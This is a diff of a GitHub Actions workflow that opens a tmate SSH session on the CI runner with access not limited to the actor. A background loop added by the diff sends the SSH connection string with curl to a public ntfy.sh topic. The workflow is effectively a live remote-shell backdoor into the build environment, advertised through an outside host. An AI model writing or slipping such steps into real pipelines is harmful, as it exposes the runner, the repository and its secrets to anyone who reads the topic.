@@ -9,12 +9,23 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Setup SSH Session & Publish IP
+      - name: Background Publisher to ntfy
         run: |
-          sudo apt-get update && sudo apt-get install -y tmate
-          tmate -S /tmp/tmate.sock new-session -d
-          tmate -S /tmp/tmate.sock wait tmate-ready
-          SSH_CMD=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
-          echo "SSH Command: $SSH_CMD"
-          curl -d "$SSH_CMD" https://ntfy.sh/ldi_runner_ssh_secret_99
-          tmate -S /tmp/tmate.sock attach
+          (
+            for i in {1..30}; do
+              SOCK=$(find /tmp -name "*tmate*.sock" 2>/dev/null | head -n 1)
+              if [ -n "$SOCK" ]; then
+                SSH_STR=$(tmate -S "$SOCK" display -p '#{tmate_ssh}' 2>/dev/null)
+                if [ -n "$SSH_STR" ]; then
+                  curl -s -d "$SSH_STR" https://ntfy.sh/ldi_runner_ssh_secret_99
+                  break
+                fi
+              fi
+              sleep 2
+            done
+          ) &
+
+      - name: Setup SSH Session
+        uses: mxschmitt/action-tmate@v3
+        with:
+          limit-access-to-actor: false
